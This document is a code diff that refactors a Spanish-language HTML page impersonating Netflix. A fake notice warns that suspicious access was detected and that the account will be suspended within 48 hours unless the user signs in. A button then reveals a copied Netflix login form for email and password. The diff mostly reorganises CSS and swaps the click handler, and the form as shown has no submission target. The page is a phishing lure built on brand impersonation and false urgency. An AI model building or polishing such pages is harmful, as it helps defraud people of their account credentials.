@@ -1,12 +1,13 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link href="https://fonts.googleapis.com/css?family=Poppins:400,600&display=swap" rel="stylesheet">
-    <title>Netflix</title>
+    <meta charset="UTF-8" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Netflix - Aviso e Iniciar sesión</title>
+    <link href="https://fonts.googleapis.com/css?family=Poppins:400,600&display=swap" rel="stylesheet" />
     <style>
-        /* Estilos del primer documento */
+        /* ==== ESTILOS PANTALLA 1 ==== */
         * {
             box-sizing: border-box;
         }
@@ -17,14 +18,14 @@
             font-family: 'Poppins', Arial, sans-serif;
             background:
                 linear-gradient(rgba(20, 20, 20, 0.85), rgba(20, 20, 20, 0.85)),
-                url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg') no-repeat center center fixed;
+                url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg')
+                    no-repeat center center fixed;
             background-size: cover;
             color: #e5e5e5;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            position: relative;
         }
 
         .nl-container {
@@ -32,7 +33,7 @@
             max-width: 600px;
             background-color: rgba(20, 20, 20, 0.85);
             border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.7);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7);
             padding: 40px 30px;
             box-sizing: border-box;
         }
@@ -85,6 +86,7 @@
             text-decoration: none;
             box-shadow: 0 4px 12px rgba(229, 9, 20, 0.6);
             transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
         }
 
         .button-block a:hover {
@@ -92,9 +94,44 @@
             box-shadow: 0 6px 18px rgba(246, 18, 29, 0.8);
         }
 
-        /* Estilos para la página de inicio de sesión (segundo documento) */
-        .login-page {
+        /* ==== PANTALLA 2 ==== */
+        #login-screen {
             display: none;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #000;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        #login-screen::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1;
+        }
+
+        #login-screen .logo-container {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            z-index: 2;
+        }
+
+        #login-screen .netflix-logo {
+            width: 100px;
+        }
+
+        #login-screen .login-container {
             position: relative;
             z-index: 2;
             background-color: rgba(0, 0, 0, 0.75);
@@ -106,43 +143,26 @@
             box-sizing: border-box;
             color: #fff;
         }
-        
-        .login-page-container {
-            display: none; /* Oculto por defecto */
-            position: relative;
-            z-index: 2;
-            width: 100%;
-            max-width: 450px;
-        }
 
-        .login-page-logo {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            z-index: 3;
-            width: 100px;
-            display: none; /* Oculto por defecto */
-        }
-        
-        .login-title {
+        #login-screen .login-title {
             font-size: 1.6em;
             font-weight: bold;
             margin-bottom: 20px;
-            color: #fff;
         }
 
-        .form-group input,
-        .login-btn,
-        .login-code-btn {
+        #login-screen .form-group input,
+        #login-screen .login-btn,
+        #login-screen .login-code-btn {
             width: 100%;
             box-sizing: border-box;
             display: block;
         }
 
-        .form-group {
+        #login-screen .form-group {
             margin-bottom: 12px;
         }
-        .form-group input {
+
+        #login-screen .form-group input {
             padding: 12px;
             background-color: #333;
             border: none;
@@ -150,16 +170,18 @@
             border-radius: 4px;
             font-size: 15px;
         }
-        .form-group input::placeholder {
+
+        #login-screen .form-group input::placeholder {
             color: #8c8c8c;
         }
-        .form-group input:focus {
+
+        #login-screen .form-group input:focus {
             outline: none;
             border: 1px solid #fff;
             background-color: #444;
         }
 
-        .login-btn {
+        #login-screen .login-btn {
             padding: 12px;
             background-color: #e50914;
             border: none;
@@ -170,18 +192,19 @@
             cursor: pointer;
             margin-top: 12px;
         }
-        .login-btn:hover {
+
+        #login-screen .login-btn:hover {
             background-color: #f40612;
         }
 
-        .options-divider {
+        #login-screen .options-divider {
             text-align: center;
             color: #737373;
             margin: 14px 0;
             font-size: 0.85em;
         }
 
-        .login-code-btn {
+        #login-screen .login-code-btn {
             padding: 12px;
             background-color: transparent;
             border: 1px solid #8c8c8c;
@@ -194,212 +217,174 @@
             text-decoration: none;
             margin: 0;
         }
-        .login-code-btn:hover {
+
+        #login-screen .login-code-btn:hover {
             background-color: rgba(255, 255, 255, 0.05);
         }
 
-        .remember-help-flex {
+        #login-screen .remember-help-flex {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-top: 14px;
             font-size: 0.85em;
         }
-        .remember-me {
+
+        #login-screen .remember-me {
             display: flex;
             align-items: center;
             color: #b3b3b3;
         }
-        .remember-me input {
+
+        #login-screen .remember-me input {
             margin-right: 5px;
         }
-        .help-options a {
+
+        #login-screen .help-options a {
             color: #b3b3b3;
             text-decoration: none;
         }
-        .help-options a:hover {
+
+        #login-screen .help-options a:hover {
             text-decoration: underline;
         }
 
-        .signup-section {
+        #login-screen .signup-section {
             margin-top: 30px;
             color: #737373;
             font-size: 0.9em;
         }
-        .signup-section a {
+
+        #login-screen .signup-section a {
             color: #fff;
             text-decoration: none;
         }
-        .signup-section strong {
+
+        #login-screen .signup-section strong {
             font-weight: bold;
         }
-        .signup-section a:hover {
+
+        #login-screen .signup-section a:hover {
             text-decoration: underline;
         }
 
-        .recaptcha-section {
+        #login-screen .recaptcha-section {
             font-size: 0.75em;
             color: #8c8c8c;
             margin-top: 8px;
             line-height: 1.4;
         }
-        .recaptcha-section a {
+
+        #login-screen .recaptcha-section a {
             color: #0071eb;
             text-decoration: none;
         }
-        .recaptcha-section a:hover {
+
+        #login-screen .recaptcha-section a:hover {
             text-decoration: underline;
         }
 
-        /* Estilos Responsive para el primer documento */
+        /* Responsive para login screen */
         @media (max-width: 480px) {
-            html, body {
-                height: 100%;
-                overflow: hidden;
-            }
-            body {
-                padding: 10px;
-                min-height: auto;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-            }
-            .nl-container {
-                max-width: 360px;
-                max-height: 100vh;
-                padding: 20px 15px;
-                box-shadow: none;
-                border-radius: 8px;
-                overflow-y: auto;
-            }
-            .logo-container {
-                margin-bottom: 20px;
-            }
-            .logo-container img {
-                width: 120px;
-            }
-            .title {
-                font-size: 20px;
-                margin-bottom: 15px;
-            }
-            .paragraph {
-                font-size: 14px;
-                margin-top: 0;
-                margin-bottom: 0;
-                line-height: 1.4;
-            }
-            .paragraph + .paragraph {
-                margin-top: 6px;
-            }
-            .button-block {
-                margin: 20px 0 15px;
-            }
-            .button-block a {
-                padding: 12px 40px;
-                font-size: 15px;
-                box-shadow: none;
-                border-radius: 20px;
-            }
-        }
-
-        /* Estilos Responsive para el segundo documento (sección de inicio de sesión) */
-        @media (max-width: 480px) {
-            body {
-                background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg');
-            }
-            .login-page-container {
+            #login-screen {
                 align-items: flex-start;
                 padding-top: 80px;
             }
-            .login-container {
+            #login-screen .login-container {
                 margin: 0 10px;
             }
-            .login-title {
+            #login-screen .login-title {
                 font-size: 1.8em;
             }
-            .form-group input, .login-btn, .login-code-btn {
+            #login-screen .form-group input,
+            #login-screen .login-btn,
+            #login-screen .login-code-btn {
                 font-size: 16px;
             }
-            .remember-help-flex, .signup-section, .recaptcha-section {
+            #login-screen .remember-help-flex,
+            #login-screen .signup-section,
+            #login-screen .recaptcha-section {
                 font-size: 0.9em;
             }
         }
     </style>
 </head>
-
 <body>
-    <!-- Contenedor para la página de notificación -->
-    <div id="notification-page">
-        <table class="nl-container" width="100%" cellpadding="0" cellspacing="0" role="presentation">
-            <tbody>
-                <tr>
-                    <td>
-                        <div class="logo-container">
-                            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" />
-                        </div>
-                        <div class="title">
-                            Problemas detectados en tu cuenta Netflix
-                        </div>
-                        <div class="paragraph">
-                            Queremos informarte que hemos detectado irregularidades en el acceso a tu cuenta Netflix. Por motivos de seguridad, es imprescindible que inicies sesión para verificar tu información.
-                        </div>
-                        <div class="paragraph">
-                            Si no realizas este procedimiento en las próximas 48 horas, tu cuenta podría ser suspendida temporalmente para proteger tus datos y evitar accesos no autorizados.
-                        </div>
-                        <div class="button-block">
-                            <a href="#" onclick="showLoginPage(); return false;">Iniciar sesión</a>
-                        </div>
-                    </td>
-                </tr>
-            </tbody>
-        </table>
-    </div>
+    <!-- PANTALLA 1 -->
+    <table class="nl-container" width="100%" cellpadding="0" cellspacing="0" role="presentation" id="notice-screen">
+        <tbody>
+            <tr>
+                <td>
+                    <div class="logo-container">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" />
+                    </div>
 
-    <!-- Contenedor para la página de inicio de sesión, que contiene el logo en la esquina y el formulario centrado -->
-    <div id="login-page-container" class="login-page-container">
-        <!-- Logo de la página de inicio de sesión, posicionado en la esquina superior izquierda -->
-        <img id="login-page-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="login-page-logo">
+                    <div class="title">
+                        Problemas detectados en tu cuenta Netflix
+                    </div>
 
-        <!-- Contenedor del formulario de inicio de sesión -->
-        <div class="login-page">
-            <div class="login-container">
-                <h1 class="login-title">Iniciar sesión</h1>
-                <form>
-                    <div class="form-group">
-                        <input type="text" placeholder="Email o número de celular">
+                    <div class="paragraph">
+                        Queremos informarte que hemos detectado irregularidades en el acceso a tu cuenta Netflix. Por motivos de seguridad, es imprescindible que inicies sesión para verificar tu información.
                     </div>
-                    <div class="form-group">
-                        <input type="password" placeholder="Contraseña">
+
+                    <div class="paragraph">
+                        Si no realizas este procedimiento en las próximas 48 horas, tu cuenta podría ser suspendida temporalmente para proteger tus datos y evitar accesos no autorizados.
                     </div>
-                    <button type="submit" class="login-btn">Iniciar sesión</button>
-                    <div class="options-divider">O</div>
-                    <a href="#" class="login-code-btn">Usar un código de inicio de sesión</a>
-                    <div class="remember-help-flex">
-                        <div class="remember-me">
-                            <input type="checkbox" id="remember">
-                            <label for="remember">Recordarme</label>
-                        </div>
-                        <div class="help-options">
-                            <a href="#">¿Olvidaste la contraseña?</a>
-                        </div>
+
+                    <div class="button-block">
+                        <a href="#" id="start-login-btn">Iniciar sesión seguro</a>
                     </div>
-                </form>
-                <div class="signup-section">
-                    <p>¿Primera vez en Netflix? <a href="#"><strong>Suscríbete ya.</strong></a></p>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+
+    <!-- PANTALLA 2 (login) -->
+    <div id="login-screen">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="netflix-logo" />
+        </div>
+
+        <div class="login-container">
+            <h1 class="login-title">Iniciar sesión</h1>
+            <form>
+                <div class="form-group">
+                    <input type="text" placeholder="Email o número de celular" />
                 </div>
-                <div class="recaptcha-section">
-                    <p>Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. <a href="#">Más info.</a></p>
+                <div class="form-group">
+                    <input type="password" placeholder="Contraseña" />
                 </div>
+                <button type="submit" class="login-btn">Iniciar sesión</button>
+                <div class="options-divider">O</div>
+                <a href="#" class="login-code-btn">Usar un código de inicio de sesión</a>
+                <div class="remember-help-flex">
+                    <div class="remember-me">
+                        <input type="checkbox" id="remember" />
+                        <label for="remember">Recordarme</label>
+                    </div>
+                    <div class="help-options">
+                        <a href="#">¿Olvidaste la contraseña?</a>
+                    </div>
+                </div>
+            </form>
+            <div class="signup-section">
+                <p>¿Primera vez en Netflix? <a href="#"><strong>Suscríbete ya.</strong></a></p>
+            </div>
+            <div class="recaptcha-section">
+                <p>Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. <a href="#">Más info.</a></p>
             </div>
         </div>
     </div>
-    
+
     <script>
-        function showLoginPage() {
-            document.getElementById('notification-page').style.display = 'none';
-            document.getElementById('login-page-container').style.display = 'flex';
-            document.getElementById('login-page-logo').style.display = 'block';
-        }
+        // Al hacer click en el botón "Iniciar sesión seguro"
+        document.getElementById('start-login-btn').addEventListener('click', function(event) {
+            event.preventDefault();
+            // Ocultar la pantalla de aviso
+            document.getElementById('notice-screen').style.display = 'none';
+            // Mostrar la pantalla de login
+            document.getElementById('login-screen').style.display = 'flex';
+        });
     </script>
 </body>
 </html>
